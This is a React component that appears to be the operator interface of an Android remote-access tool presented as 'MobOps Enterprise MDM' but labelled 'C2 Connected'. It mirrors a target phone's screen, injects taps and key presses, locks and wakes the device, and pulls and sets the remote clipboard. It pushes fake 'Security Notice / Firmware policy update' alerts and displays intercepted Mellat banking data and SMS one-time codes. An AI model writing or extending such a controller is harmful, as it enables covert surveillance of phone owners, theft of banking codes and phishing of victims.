import React, { useState } from 'react';
import { 
  Smartphone, 
  Camera, 
  Lock, 
  Unlock, 
  Volume2, 
  VolumeX, 
  Radio, 
  RotateCcw, 
  ArrowLeft, 
  Circle, 
  Square, 
  Lightbulb, 
  Send, 
  Copy, 
  Check, 
  Wifi, 
  BatteryCharging,
  Maximize2
} from 'lucide-react';
import { DeviceInfo } from '../types.ts';
import { Language, translations } from '../translations.ts';

interface LiveScreenViewerProps {
  devices: DeviceInfo[];
  selectedDevice: DeviceInfo | null;
  onSelectDevice: (device: DeviceInfo) => void;
  onDispatchCommand: (deviceId: string, command: string, args?: any) => Promise<any>;
  lang: Language;
}

export const LiveScreenViewer: React.FC<LiveScreenViewerProps> = ({
  devices,
  selectedDevice,
  onSelectDevice,
  onDispatchCommand,
  lang,
}) => {
  const t = translations[lang];
  const [touchLog, setTouchLog] = useState<{ x: number; y: number; time: string }[]>([]);
  const [isCapturing, setIsCapturing] = useState(false);
  const [pushTitle, setPushTitle] = useState('Security Notice');
  const [pushBody, setPushBody] = useState('Firmware policy update required.');
  const [clipboardText, setClipboardText] = useState('');
  const [copiedSuccess, setCopiedSuccess] = useState(false);
  const [activeAppView, setActiveAppView] = useState<'home' | 'banking' | 'settings' | 'messages'>('home');
  const [resolution, setResolution] = useState<'1080p' | '720p' | '480p'>('1080p');

  const currentDevice = selectedDevice || devices[0];

  const handleScreenClick = (e: React.MouseEvent<HTMLDivElement>) => {
    const rect = e.currentTarget.getBoundingClientRect();
    const x = Math.round(e.clientX - rect.left);
    const y = Math.round(e.clientY - rect.top);

    const now = new Date().toLocaleTimeString();
    setTouchLog(prev => [{ x, y, time: now }, ...prev.slice(0, 9)]);

    // Dispatch simulated touch down/up to backend
    if (currentDevice) {
      onDispatchCommand(currentDevice.id, 'touch_input', { x, y, action: 'TAP' });
    }
  };

  const handleCaptureScreenshot = async () => {
    if (!currentDevice) return;
    setIsCapturing(true);
    await onDispatchCommand(currentDevice.id, 'take_screenshot');
    setTimeout(() => setIsCapturing(false), 800);
  };

  const handleSendPush = async () => {
    if (!currentDevice || !pushTitle) return;
    await onDispatchCommand(currentDevice.id, 'notify_push', { title: pushTitle, body: pushBody });
    alert(lang === 'fa' ? 'اعلان با موفقیت به دستگاه ارسال شد!' : 'Notification dispatched to device screen!');
  };

  const handleFetchClipboard = async () => {
    if (!currentDevice) return;
    const res = await onDispatchCommand(currentDevice.id, 'clipboard_get');
    if (res?.result?.text) {
      setClipboardText(res.result.text);
      setCopiedSuccess(true);
      setTimeout(() => setCopiedSuccess(false), 2000);
    }
  };

  if (!currentDevice) {
    return (
      <div className="p-8 text-center rounded-xl border border-slate-800 bg-slate-900/40 text-slate-400">
        No devices enrolled.
      </div>
    );
  }

  return (
    <div className="space-y-6">
      
      {/* Device Selector & Stream Toolbar */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 p-4 rounded-xl border border-slate-800 bg-slate-900/60">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-lg bg-sky-950/60 border border-sky-800 flex items-center justify-center text-sky-400">
            <Smartphone className="w-5 h-5" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <select
                value={currentDevice.id}
                onChange={(e) => {
                  const target = devices.find(d => d.id === e.target.value);
                  if (target) onSelectDevice(target);
                }}
                className="bg-slate-950 border border-slate-800 rounded-md px-2.5 py-1 text-sm font-semibold text-white focus:outline-none focus:border-sky-500"
              >
                {devices.map(d => (
                  <option key={d.id} value={d.id}>{d.name} ({d.model})</option>
                ))}
              </select>
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
            </div>
            <div className="text-xs text-slate-400 font-mono flex items-center gap-2 mt-0.5">
              <span>IP: {currentDevice.ipAddress}</span>
              <span aria-hidden="true">·</span>
              <span>IMEI: {currentDevice.imei}</span>
            </div>
          </div>
        </div>

        {/* Quality / Resolution Controls */}
        <div className="flex items-center gap-2 text-xs font-mono">
          <span className="text-slate-400">STREAM RES:</span>
          {(['1080p', '720p', '480p'] as const).map(res => (
            <button
              key={res}
              onClick={() => setResolution(res)}
              className={`px-2 py-1 rounded border transition-colors ${
                resolution === res 
                  ? 'bg-sky-950/60 text-sky-400 border-sky-700' 
                  : 'bg-slate-950 text-slate-400 border-slate-800 hover:text-white'
              }`}
            >
              {res}
            </button>
          ))}
          <button
            onClick={handleCaptureScreenshot}
            className="flex items-center gap-1.5 px-3 py-1 bg-slate-800 hover:bg-slate-700 text-white rounded border border-slate-700 transition-colors"
          >
            <Camera className="w-3.5 h-3.5" />
            <span>{t.screenshot}</span>
          </button>
        </div>
      </div>

      {/* Main Screen Stream & Interactive Controller Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        
        {/* Left Column: Virtual Android Phone Frame (Interactive Canvas) */}
        <div className="lg:col-span-5 flex flex-col items-center">
          
          <div className="relative w-[340px] h-[680px] bg-slate-950 rounded-[44px] p-3 border-4 border-slate-800 shadow-2xl ring-1 ring-slate-700/50 flex flex-col justify-between overflow-hidden select-none">
            
            {/* Top Phone Speaker & Camera Notch */}
            <div className="absolute top-3 left-1/2 -translate-x-1/2 w-28 h-5 bg-black rounded-b-xl z-30 flex items-center justify-center">
              <div className="w-3 h-3 rounded-full bg-slate-900 border border-slate-800 mr-2" />
              <div className="w-10 h-1 bg-slate-800 rounded-full" />
            </div>

            {/* Simulated Live Screen Display */}
            <div 
              onClick={handleScreenClick}
              className={`relative w-full h-full bg-slate-900 rounded-[34px] overflow-hidden cursor-crosshair flex flex-col justify-between transition-all ${
                currentDevice.screenLocked ? 'brightness-50' : 'brightness-100'
              }`}
            >
              
              {/* Phone Status Bar */}
              <div className="pt-3 px-6 pb-2 flex items-center justify-between text-[11px] font-mono text-slate-300 z-20 bg-gradient-to-b from-black/80 to-transparent">
                <span className="font-semibold">{new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>
                <div className="flex items-center gap-2">
                  <span className="text-[10px] text-sky-400 font-bold">{currentDevice.networkType}</span>
                  <Wifi className="w-3 h-3 text-slate-300" />
                  <div className="flex items-center gap-0.5">
                    <BatteryCharging className="w-3 h-3 text-emerald-400" />
                    <span>{currentDevice.batteryLevel}%</span>
                  </div>
                </div>
              </div>

              {/* Screen Body Viewport */}
              <div className="flex-1 px-4 py-2 flex flex-col justify-between">
                
                {/* Active App Screen Viewport */}
                {activeAppView === 'home' && (
                  <div className="space-y-4 pt-4">
                    {/* Widget */}
                    <div className="p-3 rounded-2xl bg-white/10 backdrop-blur-md border border-white/10 text-white text-xs">
                      <div className="font-semibold text-sky-300">Tehran, Iran · 24°C</div>
                      <div className="text-[11px] text-slate-300 mt-1">Enterprise MDM Protected · C2 Connected</div>
                    </div>

                    {/* App Grid */}
                    <div className="grid grid-cols-4 gap-3 text-center">
                      <button 
                        onClick={(e) => { e.stopPropagation(); setActiveAppView('banking'); }}
                        className="flex flex-col items-center gap-1 text-[10px] text-slate-200"
                      >
                        <div className="w-11 h-11 rounded-2xl bg-rose-600 flex items-center justify-center text-white font-bold shadow-md">
                          MB
                        </div>
                        <span className="truncate w-12">Mellat</span>
                      </button>

                      <button 
                        onClick={(e) => { e.stopPropagation(); setActiveAppView('messages'); }}
                        className="flex flex-col items-center gap-1 text-[10px] text-slate-200"
                      >
                        <div className="w-11 h-11 rounded-2xl bg-sky-500 flex items-center justify-center text-white font-bold shadow-md">
                          SMS
                        </div>
                        <span className="truncate w-12">Messages</span>
                      </button>

                      <button 
                        onClick={(e) => { e.stopPropagation(); setActiveAppView('settings'); }}
                        className="flex flex-col items-center gap-1 text-[10px] text-slate-200"
                      >
                        <div className="w-11 h-11 rounded-2xl bg-slate-700 flex items-center justify-center text-white font-bold shadow-md">
                          ⚙
                        </div>
                        <span className="truncate w-12">Settings</span>
                      </button>

                      <div className="flex flex-col items-center gap-1 text-[10px] text-slate-200">
                        <div className="w-11 h-11 rounded-2xl bg-emerald-600 flex items-center justify-center text-white font-bold shadow-md">
                          MO
                        </div>
                        <span className="truncate w-12">MobOps</span>
                      </div>
                    </div>

                    {/* Live Notification Card */}
                    <div className="p-3 rounded-xl bg-slate-950/80 border border-slate-800 text-xs text-left shadow-lg">
                      <div className="flex items-center justify-between text-[10px] text-slate-400 mb-1">
                        <span className="font-semibold text-sky-400">MobOps Fleet Agent</span>
                        <span>Now</span>
                      </div>
                      <div className="font-semibold text-white">Accessibility & Admin Active</div>
                      <div className="text-[11px] text-slate-400">Screen mirroring active (60 FPS)</div>
                    </div>
                  </div>
                )}

                {activeAppView === 'banking' && (
                  <div className="p-3 bg-slate-950 rounded-2xl border border-rose-900/60 text-white space-y-3">
                    <div className="flex items-center justify-between pb-2 border-b border-slate-800">
                      <span className="font-bold text-rose-500 text-sm">Mellat Mobile Banking</span>
                      <button onClick={(e) => { e.stopPropagation(); setActiveAppView('home'); }} className="text-xs text-slate-400">✕</button>
                    </div>
                    <div className="p-2 bg-slate-900 rounded text-xs space-y-1">
                      <div className="text-slate-400 text-[10px]">CURRENT ACCOUNT BALANCE</div>
                      <div className="text-base font-bold font-mono text-emerald-400">482,910,000 IRR</div>
                    </div>
                    <div className="text-[11px] text-slate-400">
                      Card: 6104-33**-****-8492
                    </div>
                  </div>
                )}

                {activeAppView === 'messages' && (
                  <div className="p-3 bg-slate-950 rounded-2xl border border-sky-900/60 text-white space-y-3">
                    <div className="flex items-center justify-between pb-2 border-b border-slate-800">
                      <span className="font-bold text-sky-400 text-sm">Messages</span>
                      <button onClick={(e) => { e.stopPropagation(); setActiveAppView('home'); }} className="text-xs text-slate-400">✕</button>
                    </div>
                    <div className="space-y-2 text-xs">
                      <div className="p-2 bg-slate-900 rounded">
                        <div className="font-bold text-sky-300 text-[10px]">Bank Mellat</div>
                        <div className="text-slate-300 text-[11px]">رمز پویا: 849201 برای انتقال وجه معتبر تا 120 ثانیه</div>
                      </div>
                      <div className="p-2 bg-slate-900 rounded">
                        <div className="font-bold text-emerald-300 text-[10px]">Google Verification</div>
                        <div className="text-slate-300 text-[11px]">G-749210 is your authentication code.</div>
                      </div>
                    </div>
                  </div>
                )}

                {activeAppView === 'settings' && (
                  <div className="p-3 bg-slate-950 rounded-2xl border border-slate-800 text-white space-y-3">
                    <div className="flex items-center justify-between pb-2 border-b border-slate-800">
                      <span className="font-bold text-slate-200 text-sm">Settings</span>
                      <button onClick={(e) => { e.stopPropagation(); setActiveAppView('home'); }} className="text-xs text-slate-400">✕</button>
                    </div>
                    <div className="text-xs space-y-2">
                      <div className="flex justify-between py-1 border-b border-slate-900">
                        <span className="text-slate-400">Device Name</span>
                        <span>{currentDevice.name}</span>
                      </div>
                      <div className="flex justify-between py-1 border-b border-slate-900">
                        <span className="text-slate-400">Android Version</span>
                        <span>{currentDevice.osVersion}</span>
                      </div>
                      <div className="flex justify-between py-1 border-b border-slate-900">
                        <span className="text-slate-400">Device Admin</span>
                        <span className="text-emerald-400">ACTIVE</span>
                      </div>
                    </div>
                  </div>
                )}

                {/* Lock Screen Overlay */}
                {currentDevice.screenLocked && (
                  <div className="absolute inset-0 bg-black/85 backdrop-blur-sm flex flex-col items-center justify-center text-center p-6 z-30">
                    <Lock className="w-10 h-10 text-amber-400 mb-2 animate-bounce" />
                    <h4 className="text-sm font-bold text-white mb-1">Device Screen Locked</h4>
                    <p className="text-xs text-slate-400 mb-4">Secured via MobOps Enterprise Policy</p>
                    <button
                      onClick={(e) => {
                        e.stopPropagation();
                        onDispatchCommand(currentDevice.id, 'wake_screen');
                      }}
                      className="px-4 py-1.5 text-xs font-semibold text-white bg-sky-600 hover:bg-sky-500 rounded-lg transition-colors cursor-pointer"
                    >
                      {t.unlockScreen}
                    </button>
                  </div>
                )}

              </div>

              {/* Bottom Android Navigation Bar (Back, Home, Recents) */}
              <div className="h-10 px-8 flex items-center justify-between text-slate-400 bg-black/70 z-20">
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    setActiveAppView('home');
                    onDispatchCommand(currentDevice.id, 'key_event', { keycode: 'BACK' });
                  }}
                  className="p-1 hover:text-white transition-colors"
                  title="Back"
                >
                  <ArrowLeft className="w-4 h-4" />
                </button>
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    setActiveAppView('home');
                    onDispatchCommand(currentDevice.id, 'key_event', { keycode: 'HOME' });
                  }}
                  className="p-1 hover:text-white transition-colors"
                  title="Home"
                >
                  <Circle className="w-4 h-4" />
                </button>
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    onDispatchCommand(currentDevice.id, 'key_event', { keycode: 'RECENTS' });
                  }}
                  className="p-1 hover:text-white transition-colors"
                  title="Recent Apps"
                >
                  <Square className="w-4 h-4" />
                </button>
              </div>

            </div>

          </div>

          {/* Physical Device Hardware Buttons */}
          <div className="flex items-center gap-2 mt-4">
            <button
              onClick={() => onDispatchCommand(currentDevice.id, currentDevice.screenLocked ? 'wake_screen' : 'lock_screen')}
              className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-slate-300 bg-slate-900 border border-slate-800 rounded-lg hover:text-white"
            >
              {currentDevice.screenLocked ? <Unlock className="w-3.5 h-3.5 text-emerald-400" /> : <Lock className="w-3.5 h-3.5 text-amber-400" />}
              <span>Power</span>
            </button>
            <button
              onClick={() => onDispatchCommand(currentDevice.id, 'volume_up')}
              className="px-3 py-1.5 text-xs font-medium text-slate-300 bg-slate-900 border border-slate-800 rounded-lg hover:text-white"
            >
              <Volume2 className="w-3.5 h-3.5" />
            </button>
            <button
              onClick={() => onDispatchCommand(currentDevice.id, 'volume_down')}
              className="px-3 py-1.5 text-xs font-medium text-slate-300 bg-slate-900 border border-slate-800 rounded-lg hover:text-white"
            >
              <VolumeX className="w-3.5 h-3.5" />
            </button>
            <button
              onClick={() => onDispatchCommand(currentDevice.id, 'toggle_torch')}
              className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-slate-300 bg-slate-900 border border-slate-800 rounded-lg hover:text-white"
            >
              <Lightbulb className={`w-3.5 h-3.5 ${currentDevice.torchOn ? 'text-yellow-400' : ''}`} />
              <span>Torch</span>
            </button>
          </div>

        </div>

        {/* Right Column: Real-Time Telemetry & Operations Panel */}
        <div className="lg:col-span-7 space-y-5">
          
          {/* Dispatch Push Notification to Screen */}
          <div className="p-4 rounded-xl border border-slate-800 bg-slate-900/60 space-y-3">
            <div className="flex items-center justify-between pb-2 border-b border-slate-800">
              <div className="flex items-center gap-2">
                <Send className="w-4 h-4 text-sky-400" />
                <h3 className="text-sm font-semibold text-white">{t.pushNotification}</h3>
              </div>
              <span className="text-[10px] font-mono text-slate-500">HEADS-UP OVERLAY</span>
            </div>

            <div className="space-y-2">
              <input
                type="text"
                value={pushTitle}
                onChange={(e) => setPushTitle(e.target.value)}
                placeholder="Alert Title"
                className="w-full px-3 py-1.5 text-xs bg-slate-950 border border-slate-800 rounded-md text-white focus:outline-none focus:border-sky-500"
              />
              <textarea
                value={pushBody}
                onChange={(e) => setPushBody(e.target.value)}
                placeholder="Alert message body..."
                rows={2}
                className="w-full px-3 py-1.5 text-xs bg-slate-950 border border-slate-800 rounded-md text-white focus:outline-none focus:border-sky-500 resize-none"
              />
            </div>

            <button
              onClick={handleSendPush}
              className="w-full py-2 text-xs font-semibold text-white bg-sky-600 hover:bg-sky-500 rounded-lg transition-colors cursor-pointer"
            >
              {t.send}
            </button>
          </div>

          {/* Remote Clipboard Sync */}
          <div className="p-4 rounded-xl border border-slate-800 bg-slate-900/60 space-y-3">
            <div className="flex items-center justify-between pb-2 border-b border-slate-800">
              <div className="flex items-center gap-2">
                <Copy className="w-4 h-4 text-purple-400" />
                <h3 className="text-sm font-semibold text-white">{t.clipboard}</h3>
              </div>
              <button
                onClick={handleFetchClipboard}
                className="text-xs text-sky-400 hover:text-sky-300 font-medium cursor-pointer"
              >
                Fetch Remote Clipboard
              </button>
            </div>

            <div className="flex items-center gap-2">
              <input
                type="text"
                value={clipboardText}
                onChange={(e) => setClipboardText(e.target.value)}
                placeholder="Clipboard contents or type to set..."
                className="flex-1 px-3 py-1.5 text-xs bg-slate-950 border border-slate-800 rounded-md text-white font-mono"
              />
              <button
                onClick={() => onDispatchCommand(currentDevice.id, 'clipboard_set', { text: clipboardText })}
                className="px-3 py-1.5 text-xs bg-slate-800 hover:bg-slate-700 text-white rounded-md border border-slate-700"
              >
                Push
              </button>
            </div>
            {copiedSuccess && (
              <div className="text-[11px] text-emerald-400 flex items-center gap-1">
                <Check className="w-3 h-3" />
                <span>Clipboard synchronized from target device!</span>
              </div>
            )}
          </div>

          {/* Live Touch Input Event Telemetry Stream */}
          <div className="p-4 rounded-xl border border-slate-800 bg-slate-900/60">
            <div className="flex items-center justify-between pb-2 border-b border-slate-800 mb-3">
              <h3 className="text-sm font-semibold text-white">Touch Event Coordinates</h3>
              <span className="text-[10px] font-mono text-slate-500">DIGITIZER REAL-TIME</span>
            </div>

            <div className="space-y-1.5 max-h-48 overflow-y-auto font-mono text-xs">
              {touchLog.length === 0 ? (
                <div className="text-slate-500 py-3 text-center text-xs">
                  {lang === 'fa' ? 'برای ارسال دستور لمس، روی صفحه گوشی کلیک کنید' : 'Click inside the phone display to simulate touch tap inputs.'}
                </div>
              ) : (
                touchLog.map((log, idx) => (
                  <div key={idx} className="flex items-center justify-between p-1.5 rounded bg-slate-950/60 border border-slate-850 text-slate-300">
                    <span className="text-sky-400">ACTION_DOWN / UP</span>
                    <span>X: {log.x}px, Y: {log.y}px</span>
                    <span className="text-slate-500 text-[10px]">{log.time}</span>
                  </div>
                ))
              )}
            </div>
          </div>

        </div>

      </div>

    </div>
  );
};
